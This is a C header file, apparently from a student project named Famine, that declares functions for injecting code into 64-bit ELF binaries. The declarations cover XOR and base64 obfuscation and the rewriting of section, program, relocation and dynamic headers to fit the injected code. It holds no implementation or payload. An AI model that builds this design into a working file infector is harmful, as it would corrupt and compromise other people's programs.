#include "../libelf/libftelf.h"
#include "../libft/libft.h"

#ifndef FAMINE_H
#define FAMINE_H

struct crypt_res {
    unsigned char *data;
    char *key;
    size_t len;
};

struct code {
    size_t offset_injection;
    size_t strings_size;
    unsigned char *strings;
    size_t code_size;
    unsigned char *code;
};

unsigned char       *encrypt_b64(unsigned char *buf, size_t size);
unsigned char       *decrypt_b64(unsigned char *buf, size_t size);

unsigned char       *generate_random_key(size_t len);
void                apply_xor(unsigned char *buf, size_t len, char *key);


int                 write_file(unsigned char *buf, size_t size);

unsigned char       *change_buffer(struct code *code, unsigned char *buf, struct ELFheaders64 file_header, size_t file_size);
int                 get_section_index(char *section, unsigned char *buf, struct sheaders64 *sheaders, struct ELFheaders64 file_header);

void                change_symbole_size(size_t offset_injection, size_t code_size, char *sym, unsigned char *buf);

void                change_sections_header_offset(size_t size, size_t offset_injection, unsigned char *buf, struct ELFheaders64 elfheader);
void                change_program_header(size_t size, unsigned char *buf, struct pheaders64 *pheaders, struct ELFheaders64 elfHeader);
void                change_program_offset(size_t size, unsigned char *buf, struct ELFheaders64 file_header);
void                change_file_header(size_t size, unsigned char *buf, struct ELFheaders64 *file_header, struct sheaders64 section_hd);

char                **get_rel_sections_names(unsigned char *buf, struct sheaders64 *sheaders, struct ELFheaders64 elfHeader);
char                **get_rela_sections_names(unsigned char *buf, struct sheaders64 *sheaders, struct ELFheaders64 elfHeader);
void                change_rela_offset(unsigned char *buf, struct sheaders64 sheader, Elf64_Rela *relas);
void                change_rel_offset(unsigned char *buf, struct sheaders64 sheader, Elf64_Rel *rels);

void                change_dynamic_offset(unsigned char *buf, struct sheaders64 *sheaders, struct ELFheaders64 elfHeader);

unsigned char       *get_code(size_t *size);

#endif